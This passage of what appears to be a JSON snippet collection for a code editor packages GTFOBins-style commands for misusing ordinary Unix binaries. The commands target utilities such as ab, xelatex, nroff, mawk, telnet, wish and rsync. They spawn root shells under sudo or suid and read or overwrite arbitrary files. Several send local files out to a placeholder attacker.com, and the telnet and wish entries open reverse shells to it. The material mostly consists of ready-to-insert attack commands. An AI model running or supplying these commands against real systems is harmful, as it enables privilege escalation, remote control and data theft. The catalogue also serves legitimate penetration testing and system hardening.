            "```"
        ],
        "description": "abuse ab with file-download - Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length."
    },
    "ab suid (gtfobins)": {
        "prefix": "ab suid",
        "body": [
            "abuse ab with suid, Upload local file via HTTP POST request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "./ab -p \\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse ab with suid - Upload local file via HTTP POST request."
    },
    "ab sudo (gtfobins)": {
        "prefix": "ab sudo",
        "body": [
            "abuse ab with sudo, Upload local file via HTTP POST request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "sudo ab -p \\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse ab with sudo - Upload local file via HTTP POST request."
    },
    "dc shell (gtfobins)": {
        "prefix": "dc shell",
        "body": [
            "abuse dc with shell",
            "",
            "```sh",
            "dc -e '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse dc with shell"
    },
    "dc sudo (gtfobins)": {
        "prefix": "dc sudo",
        "body": [
            "abuse dc with sudo",
            "",
            "```sh",
            "sudo dc -e '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse dc with sudo"
    },
    "dc limited-suid (gtfobins)": {
        "prefix": "dc limited-suid",
        "body": [
            "abuse dc with limited-suid",
            "",
            "```sh",
            "./dc -e '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse dc with limited-suid"
    },
    "systemd-resolve sudo (gtfobins)": {
        "prefix": "systemd-resolve sudo",
        "body": [
            "abuse systemd-resolve with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo systemd-resolve --status",
            "!sh${0}",
            "```"
        ],
        "description": "abuse systemd-resolve with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "hd file-read (gtfobins)": {
        "prefix": "hd file-read",
        "body": [
            "abuse hd with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "hd \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hd with file-read"
    },
    "hd suid (gtfobins)": {
        "prefix": "hd suid",
        "body": [
            "abuse hd with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./hd \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hd with suid"
    },
    "hd sudo (gtfobins)": {
        "prefix": "hd sudo",
        "body": [
            "abuse hd with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo hd \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hd with sudo"
    },
    "xelatex shell (gtfobins)": {
        "prefix": "xelatex shell",
        "body": [
            "abuse xelatex with shell",
            "",
            "```sh",
            "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse xelatex with shell"
    },
    "xelatex file-read (gtfobins)": {
        "prefix": "xelatex file-read",
        "body": [
            "abuse xelatex with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}'",
            "strings article.dvi${0}",
            "```"
        ],
        "description": "abuse xelatex with file-read - The read file will be part of the output."
    },
    "xelatex sudo (gtfobins)": {
        "prefix": "xelatex sudo",
        "body": [
            "abuse xelatex with sudo",
            "",
            "```sh",
            "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse xelatex with sudo"
    },
    "xelatex limited-suid (gtfobins)": {
        "prefix": "xelatex limited-suid",
        "body": [
            "abuse xelatex with limited-suid",
            "",
            "```sh",
            "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse xelatex with limited-suid"
    },
    "nroff file-read (gtfobins)": {
        "prefix": "nroff file-read",
        "body": [
            "abuse nroff with file-read, The file is typeset and some warning messages may appear.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nroff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nroff with file-read - The file is typeset and some warning messages may appear."
    },
    "nroff shell (gtfobins)": {
        "prefix": "nroff shell",
        "body": [
            "abuse nroff with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '#!/bin/sh' > \\$TF/groff",
            "echo '/bin/sh' >> \\$TF/groff",
            "chmod +x \\$TF/groff",
            "GROFF_BIN_PATH=\\$TF nroff${0}",
            "```"
        ],
        "description": "abuse nroff with shell"
    },
    "nroff sudo (gtfobins)": {
        "prefix": "nroff sudo",
        "body": [
            "abuse nroff with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '#!/bin/sh' > \\$TF/groff",
            "echo '/bin/sh' >> \\$TF/groff",
            "chmod +x \\$TF/groff",
            "sudo GROFF_BIN_PATH=\\$TF nroff${0}",
            "```"
        ],
        "description": "abuse nroff with sudo"
    },
    "pg shell (gtfobins)": {
        "prefix": "pg shell",
        "body": [
            "abuse pg with shell",
            "",
            "```sh",
            "pg /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse pg with shell"
    },
    "pg file-read (gtfobins)": {
        "prefix": "pg file-read",
        "body": [
            "abuse pg with file-read",
            "",
            "```sh",
            "pg ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse pg with file-read"
    },
    "pg sudo (gtfobins)": {
        "prefix": "pg sudo",
        "body": [
            "abuse pg with sudo",
            "",
            "```sh",
            "sudo pg /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse pg with sudo"
    },
    "pg suid (gtfobins)": {
        "prefix": "pg suid",
        "body": [
            "abuse pg with suid",
            "",
            "```sh",
            "./pg ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse pg with suid"
    },
    "msgmerge file-read (gtfobins)": {
        "prefix": "msgmerge file-read",
        "body": [
            "abuse msgmerge with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgmerge -P \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse msgmerge with file-read"
    },
    "msgmerge sudo (gtfobins)": {
        "prefix": "msgmerge sudo",
        "body": [
            "abuse msgmerge with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgmerge -P \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse msgmerge with sudo"
    },
    "msgmerge suid (gtfobins)": {
        "prefix": "msgmerge suid",
        "body": [
            "abuse msgmerge with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgmerge -P \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse msgmerge with suid"
    },
    "cabal shell (gtfobins)": {
        "prefix": "cabal shell",
        "body": [
            "abuse cabal with shell",
            "",
            "```sh",
            "cabal exec -- /bin/sh${0}",
            "```"
        ],
        "description": "abuse cabal with shell"
    },
    "cabal suid (gtfobins)": {
        "prefix": "cabal suid",
        "body": [
            "abuse cabal with suid",
            "",
            "```sh",
            "./cabal exec -- /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse cabal with suid"
    },
    "cabal sudo (gtfobins)": {
        "prefix": "cabal sudo",
        "body": [
            "abuse cabal with sudo",
            "",
            "```sh",
            "sudo cabal exec -- /bin/sh${0}",
            "```"
        ],
        "description": "abuse cabal with sudo"
    },
    "tdbtool shell (gtfobins)": {
        "prefix": "tdbtool shell",
        "body": [
            "abuse tdbtool with shell",
            "",
            "```sh",
            "tdbtool",
            "! /bin/sh${0}",
            "```"
        ],
        "description": "abuse tdbtool with shell"
    },
    "tdbtool sudo (gtfobins)": {
        "prefix": "tdbtool sudo",
        "body": [
            "abuse tdbtool with sudo",
            "",
            "```sh",
            "sudo tdbtool",
            "! /bin/sh${0}",
            "```"
        ],
        "description": "abuse tdbtool with sudo"
    },
    "tdbtool limited-suid (gtfobins)": {
        "prefix": "tdbtool limited-suid",
        "body": [
            "abuse tdbtool with limited-suid",
            "",
            "```sh",
            "./tdbtool",
            "! /bin/sh${0}",
            "```"
        ],
        "description": "abuse tdbtool with limited-suid"
    },
    "zsoelim file-read (gtfobins)": {
        "prefix": "zsoelim file-read",
        "body": [
            "abuse zsoelim with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "zsoelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse zsoelim with file-read"
    },
    "zsoelim suid (gtfobins)": {
        "prefix": "zsoelim suid",
        "body": [
            "abuse zsoelim with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./zsoelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse zsoelim with suid"
    },
    "zsoelim sudo (gtfobins)": {
        "prefix": "zsoelim sudo",
        "body": [
            "abuse zsoelim with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo zsoelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse zsoelim with sudo"
    },
    "cancel file-upload (gtfobins)": {
        "prefix": "cancel file-upload",
        "body": [
            "abuse cancel with file-upload, Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "cancel -u \"\\$(cat \\$LFILE)\" -h \\$RHOST:\\$RPORT${0}",
            "```"
        ],
        "description": "abuse cancel with file-upload - Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "cowsay shell (gtfobins)": {
        "prefix": "cowsay shell",
        "body": [
            "abuse cowsay with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "cowsay -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowsay with shell"
    },
    "cowsay sudo (gtfobins)": {
        "prefix": "cowsay sudo",
        "body": [
            "abuse cowsay with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "sudo cowsay -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowsay with sudo"
    },
    "dialog file-read (gtfobins)": {
        "prefix": "dialog file-read",
        "body": [
            "abuse dialog with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dialog --textbox \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse dialog with file-read"
    },
    "dialog suid (gtfobins)": {
        "prefix": "dialog suid",
        "body": [
            "abuse dialog with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./dialog --textbox \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse dialog with suid"
    },
    "dialog sudo (gtfobins)": {
        "prefix": "dialog sudo",
        "body": [
            "abuse dialog with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo dialog --textbox \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse dialog with sudo"
    },
    "uuencode file-read (gtfobins)": {
        "prefix": "uuencode file-read",
        "body": [
            "abuse uuencode with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uuencode with file-read"
    },
    "uuencode suid (gtfobins)": {
        "prefix": "uuencode suid",
        "body": [
            "abuse uuencode with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uuencode with suid"
    },
    "uuencode sudo (gtfobins)": {
        "prefix": "uuencode sudo",
        "body": [
            "abuse uuencode with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uuencode with sudo"
    },
    "comm file-read (gtfobins)": {
        "prefix": "comm file-read",
        "body": [
            "abuse comm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "comm \\$LFILE /dev/null 2>/dev/null${0}",
            "```"
        ],
        "description": "abuse comm with file-read"
    },
    "comm suid (gtfobins)": {
        "prefix": "comm suid",
        "body": [
            "abuse comm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "comm \\$LFILE /dev/null 2>/dev/null${0}",
            "```"
        ],
        "description": "abuse comm with suid"
    },
    "comm sudo (gtfobins)": {
        "prefix": "comm sudo",
        "body": [
            "abuse comm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo comm \\$LFILE /dev/null 2>/dev/null${0}",
            "```"
        ],
        "description": "abuse comm with sudo"
    },
    "chmod suid (gtfobins)": {
        "prefix": "chmod suid",
        "body": [
            "abuse chmod with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "./chmod 6777 \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chmod with suid"
    },
    "chmod sudo (gtfobins)": {
        "prefix": "chmod sudo",
        "body": [
            "abuse chmod with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "sudo chmod 6777 \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chmod with sudo"
    },
    "ssh-agent shell (gtfobins)": {
        "prefix": "ssh-agent shell",
        "body": [
            "abuse ssh-agent with shell",
            "",
            "```sh",
            "ssh-agent /bin/sh${0}",
            "```"
        ],
        "description": "abuse ssh-agent with shell"
    },
    "ssh-agent suid (gtfobins)": {
        "prefix": "ssh-agent suid",
        "body": [
            "abuse ssh-agent with suid",
            "",
            "```sh",
            "./ssh-agent /bin/ -p${0}",
            "```"
        ],
        "description": "abuse ssh-agent with suid"
    },
    "ssh-agent sudo (gtfobins)": {
        "prefix": "ssh-agent sudo",
        "body": [
            "abuse ssh-agent with sudo",
            "",
            "```sh",
            "sudo ssh-agent /bin/${0}",
            "```"
        ],
        "description": "abuse ssh-agent with sudo"
    },
    "mawk shell (gtfobins)": {
        "prefix": "mawk shell",
        "body": [
            "abuse mawk with shell",
            "",
            "```sh",
            "mawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse mawk with shell"
    },
    "mawk file-write (gtfobins)": {
        "prefix": "mawk file-write",
        "body": [
            "abuse mawk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "mawk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse mawk with file-write"
    },
    "mawk file-read (gtfobins)": {
        "prefix": "mawk file-read",
        "body": [
            "abuse mawk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "mawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mawk with file-read"
    },
    "mawk suid (gtfobins)": {
        "prefix": "mawk suid",
        "body": [
            "abuse mawk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./mawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mawk with suid"
    },
    "mawk sudo (gtfobins)": {
        "prefix": "mawk sudo",
        "body": [
            "abuse mawk with sudo",
            "",
            "```sh",
            "sudo mawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse mawk with sudo"
    },
    "mawk limited-suid (gtfobins)": {
        "prefix": "mawk limited-suid",
        "body": [
            "abuse mawk with limited-suid",
            "",
            "```sh",
            "./mawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse mawk with limited-suid"
    },
    "rev file-read (gtfobins)": {
        "prefix": "rev file-read",
        "body": [
            "abuse rev with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "rev \\$LFILE | rev${0}",
            "```"
        ],
        "description": "abuse rev with file-read"
    },
    "rev suid (gtfobins)": {
        "prefix": "rev suid",
        "body": [
            "abuse rev with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./rev \\$LFILE | rev${0}",
            "```"
        ],
        "description": "abuse rev with suid"
    },
    "rev sudo (gtfobins)": {
        "prefix": "rev sudo",
        "body": [
            "abuse rev with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo rev \\$LFILE | rev${0}",
            "```"
        ],
        "description": "abuse rev with sudo"
    },
    "msfconsole shell (gtfobins)": {
        "prefix": "msfconsole shell",
        "body": [
            "abuse msfconsole with shell",
            "",
            "```sh",
            "sudo msfconsole",
            "msf6 > irb",
            ">> system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse msfconsole with shell"
    },
    "msfconsole sudo (gtfobins)": {
        "prefix": "msfconsole sudo",
        "body": [
            "abuse msfconsole with sudo",
            "",
            "```sh",
            "sudo msfconsole",
            "msf6 > irb",
            ">> system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse msfconsole with sudo"
    },
    "tex shell (gtfobins)": {
        "prefix": "tex shell",
        "body": [
            "abuse tex with shell",
            "",
            "```sh",
            "tex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse tex with shell"
    },
    "tex sudo (gtfobins)": {
        "prefix": "tex sudo",
        "body": [
            "abuse tex with sudo",
            "",
            "```sh",
            "sudo tex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse tex with sudo"
    },
    "tex limited-suid (gtfobins)": {
        "prefix": "tex limited-suid",
        "body": [
            "abuse tex with limited-suid",
            "",
            "```sh",
            "./tex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse tex with limited-suid"
    },
    "pwsh shell (gtfobins)": {
        "prefix": "pwsh shell",
        "body": [
            "abuse pwsh with shell",
            "",
            "```sh",
            "pwsh${0}",
            "```"
        ],
        "description": "abuse pwsh with shell"
    },
    "pwsh file-write (gtfobins)": {
        "prefix": "pwsh file-write",
        "body": [
            "abuse pwsh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "pwsh -c '\"DATA\" | Out-File \\$env:LFILE'${0}",
            "```"
        ],
        "description": "abuse pwsh with file-write"
    },
    "pwsh sudo (gtfobins)": {
        "prefix": "pwsh sudo",
        "body": [
            "abuse pwsh with sudo",
            "",
            "```sh",
            "sudo pwsh${0}",
            "```"
        ],
        "description": "abuse pwsh with sudo"
    },
    "espeak file-read (gtfobins)": {
        "prefix": "espeak file-read",
        "body": [
            "abuse espeak with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "espeak -qXf \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse espeak with file-read"
    },
    "espeak suid (gtfobins)": {
        "prefix": "espeak suid",
        "body": [
            "abuse espeak with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./espeak -qXf \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse espeak with suid"
    },
    "espeak sudo (gtfobins)": {
        "prefix": "espeak sudo",
        "body": [
            "abuse espeak with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo espeak -qXf \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse espeak with sudo"
    },
    "wish shell (gtfobins)": {
        "prefix": "wish shell",
        "body": [
            "abuse wish with shell",
            "",
            "```sh",
            "wish",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse wish with shell"
    },
    "wish non-interactive-reverse-shell (gtfobins)": {
        "prefix": "wish non-interactive-reverse-shell",
        "body": [
            "abuse wish with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "echo 'set s [socket \\$::env(RHOST) \\$::env(RPORT)];while 1 { puts -nonewline \\$s \"> \";flush \\$s;gets \\$s c;set e \"exec \\$c\";if {![catch {set r [eval \\$e]} err]} { puts \\$s \\$r }; flush \\$s; }; close \\$s;' | wish${0}",
            "```"
        ],
        "description": "abuse wish with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "wish sudo (gtfobins)": {
        "prefix": "wish sudo",
        "body": [
            "abuse wish with sudo",
            "",
            "```sh",
            "sudo wish",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse wish with sudo"
    },
    "sg shell (gtfobins)": {
        "prefix": "sg shell",
        "body": [
            "abuse sg with shell, Commands can be run if the current user's group is specified, therefore no additional permissions are needed.",
            "",
            "```sh",
            "sg \\$(id -ng)${0}",
            "```"
        ],
        "description": "abuse sg with shell - Commands can be run if the current user's group is specified, therefore no additional permissions are needed."
    },
    "sg sudo (gtfobins)": {
        "prefix": "sg sudo",
        "body": [
            "abuse sg with sudo",
            "",
            "```sh",
            "sudo sg root${0}",
            "```"
        ],
        "description": "abuse sg with sudo"
    },
    "nohup shell (gtfobins)": {
        "prefix": "nohup shell",
        "body": [
            "abuse nohup with shell",
            "",
            "```sh",
            "nohup /bin/sh -c \"sh <\\$(tty) >\\$(tty) 2>\\$(tty)\"${0}",
            "```"
        ],
        "description": "abuse nohup with shell"
    },
    "nohup command (gtfobins)": {
        "prefix": "nohup command",
        "body": [
            "abuse nohup with command",
            "",
            "```sh",
            "COMMAND='/usr/bin/id'",
            "nohup \"\\$COMMAND\"",
            "cat nohup.out${0}",
            "```"
        ],
        "description": "abuse nohup with command"
    },
    "nohup suid (gtfobins)": {
        "prefix": "nohup suid",
        "body": [
            "abuse nohup with suid",
            "",
            "```sh",
            "./nohup /bin/sh -p -c \"sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)\"${0}",
            "```"
        ],
        "description": "abuse nohup with suid"
    },
    "nohup sudo (gtfobins)": {
        "prefix": "nohup sudo",
        "body": [
            "abuse nohup with sudo",
            "",
            "```sh",
            "sudo nohup /bin/sh -c \"sh <\\$(tty) >\\$(tty) 2>\\$(tty)\"${0}",
            "```"
        ],
        "description": "abuse nohup with sudo"
    },
    "telnet shell (gtfobins)": {
        "prefix": "telnet shell",
        "body": [
            "abuse telnet with shell, BSD version only. Needs to be connected first.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "telnet \\$RHOST \\$RPORT",
            "^]",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse telnet with shell - BSD version only. Needs to be connected first."
    },
    "telnet reverse-shell (gtfobins)": {
        "prefix": "telnet reverse-shell",
        "body": [
            "abuse telnet with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "TF=\\$(mktemp -u)",
            "mkfifo \\$TF && telnet \\$RHOST \\$RPORT 0<\\$TF | /bin/sh 1>\\$TF${0}",
            "```"
        ],
        "description": "abuse telnet with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "telnet sudo (gtfobins)": {
        "prefix": "telnet sudo",
        "body": [
            "abuse telnet with sudo, BSD version only. Needs to be connected first.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "sudo telnet \\$RHOST \\$RPORT",
            "^]",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse telnet with sudo - BSD version only. Needs to be connected first."
    },
    "telnet limited-suid (gtfobins)": {
        "prefix": "telnet limited-suid",
        "body": [
            "abuse telnet with limited-suid, BSD version only. Needs to be connected first.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "./telnet \\$RHOST \\$RPORT",
            "^]",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse telnet with limited-suid - BSD version only. Needs to be connected first."
    },
    "bundle shell (gtfobins)": {
        "prefix": "bundle shell",
        "body": [
            "abuse bundle with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'system(\"/bin/sh\")' > \\$TF/Gemfile",
            "cd \\$TF",
            "bundle install${0}",
            "```"
        ],
        "description": "abuse bundle with shell"
    },
    "bundle sudo (gtfobins)": {
        "prefix": "bundle sudo",
        "body": [
            "abuse bundle with sudo, This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo bundle help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse bundle with sudo - This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
    },
    "od file-read (gtfobins)": {
        "prefix": "od file-read",
        "body": [
            "abuse od with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "od -An -c -w9999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse od with file-read"
    },
    "od suid (gtfobins)": {
        "prefix": "od suid",
        "body": [
            "abuse od with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./od -An -c -w9999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse od with suid"
    },
    "od sudo (gtfobins)": {
        "prefix": "od sudo",
        "body": [
            "abuse od with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo od -An -c -w9999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse od with sudo"
    },
    "time shell (gtfobins)": {
        "prefix": "time shell",
        "body": [
            "abuse time with shell",
            "",
            "```sh",
            "/usr/bin/time /bin/sh${0}",
            "```"
        ],
        "description": "abuse time with shell"
    },
    "time suid (gtfobins)": {
        "prefix": "time suid",
        "body": [
            "abuse time with suid",
            "",
            "```sh",
            "./time /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse time with suid"
    },
    "time sudo (gtfobins)": {
        "prefix": "time sudo",
        "body": [
            "abuse time with sudo",
            "",
            "```sh",
            "sudo /usr/bin/time /bin/sh${0}",
            "```"
        ],
        "description": "abuse time with sudo"
    },
    "bundler shell (gtfobins)": {
        "prefix": "bundler shell",
        "body": [
            "abuse bundler with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'system(\"/bin/sh\")' > \\$TF/Gemfile",
            "cd \\$TF",
            "bundler install${0}",
            "```"
        ],
        "description": "abuse bundler with shell"
    },
    "bundler sudo (gtfobins)": {
        "prefix": "bundler sudo",
        "body": [
            "abuse bundler with sudo, This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo bundler help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse bundler with sudo - This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
    },
    "scrot shell (gtfobins)": {
        "prefix": "scrot shell",
        "body": [
            "abuse scrot with shell",
            "",
            "```sh",
            "scrot -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse scrot with shell"
    },
    "scrot limited-suid (gtfobins)": {
        "prefix": "scrot limited-suid",
        "body": [
            "abuse scrot with limited-suid",
            "",
            "```sh",
            "./scrot -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse scrot with limited-suid"
    },
    "scrot sudo (gtfobins)": {
        "prefix": "scrot sudo",
        "body": [
            "abuse scrot with sudo",
            "",
            "```sh",
            "sudo scrot -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse scrot with sudo"
    },
    "perf shell (gtfobins)": {
        "prefix": "perf shell",
        "body": [
            "abuse perf with shell",
            "",
            "```sh",
            "perf stat /bin/sh${0}",
            "```"
        ],
        "description": "abuse perf with shell"
    },
    "perf suid (gtfobins)": {
        "prefix": "perf suid",
        "body": [
            "abuse perf with suid",
            "",
            "```sh",
            "./perf stat /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse perf with suid"
    },
    "perf sudo (gtfobins)": {
        "prefix": "perf sudo",
        "body": [
            "abuse perf with sudo",
            "",
            "```sh",
            "sudo perf stat /bin/sh${0}",
            "```"
        ],
        "description": "abuse perf with sudo"
    },
    "rsync shell (gtfobins)": {
        "prefix": "rsync shell",
        "body": [
            "abuse rsync with shell",
            "",
            "```sh",
            "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null${0}",
            "```"
        ],
        "description": "abuse rsync with shell"
    },
    "rsync sudo (gtfobins)": {
        "prefix": "rsync sudo",
        "body": [
            "abuse rsync with sudo",
            "",
            "```sh",
            "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null${0}",
            "```"
        ],
        "description": "abuse rsync with sudo"
    },
    "rsync suid (gtfobins)": {
        "prefix": "rsync suid",
        "body": [
            "abuse rsync with suid",
            "",
            "```sh",
            "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null${0}",
            "```"
        ],
        "description": "abuse rsync with suid"
    },
    "dmidecode sudo (gtfobins)": {
        "prefix": "dmidecode sudo",
        "body": [
            "abuse dmidecode with sudo, \nIt can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\n\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n\n\n```\n\nmake dmiwrite\n\nTF=$(mktemp)\n\necho \"DATA\" > $TF\n\n./dmiwrite $TF x.dmi\n\n```\n",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sudo dmidecode --no-sysfs -d x.dmi --dump-bin \"\\$LFILE\"${0}",
            "```"
        ],
